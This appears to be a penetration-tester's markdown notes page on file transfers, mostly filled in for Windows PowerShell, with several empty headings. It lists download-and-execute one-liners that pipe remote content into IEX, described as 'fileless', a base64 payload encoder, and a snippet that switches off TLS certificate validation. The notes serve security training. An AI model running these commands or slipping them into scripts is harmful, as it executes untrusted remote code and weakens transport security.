# File Transfers
## References and Links
[Harmj0y Powershell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

## Linux File Transfers
## Windows File Transfers
### PowerShell Base64 Encode/Decode
```powershell
#Base64 Encode
[Convert]::ToBase64String((Get-Content -path "File_to_Encode" -Encoding byte))
#Base64 Decode
[IO.File]::WriteAllBytes("Output_File", [Convert]::FromBase64String("Base64_Encoded_Payload"))
```
### PowerShell Web Downloads
1. Files vs. Fileless  
a. Files = Download and save the file  
b. Fileless = Download and execute without saving the file 
```powershell
# File Download Example
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

# Fileless Download Example
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
# We can also pipe the input directly into IEX
(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
``` 
Powershell v3.0 and later can use Invoke-WebRequest(by default is aliased to ```iwr```,```curl```, and ```wget```)
```powershell
Invoke-WebRequest <Target File URL> -OutFile <Output_File_Name>
```
**Common Errors with Powershell**  
Internet Explorer first-launch configuration not being completed will prevent downloads. To bypass, use ```-UseBasicParsing```
```Powershell
Invoke-WebRequest <Target file URL> -UseBasicParsing | IEX
```
SSL/TLS secure channel throws an error if the certificate is not trusted.  
Bypass:
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### SMB Downloads

## Transferring with Code
## Misc File Transfer Methods
## Catching files over HTTP/S
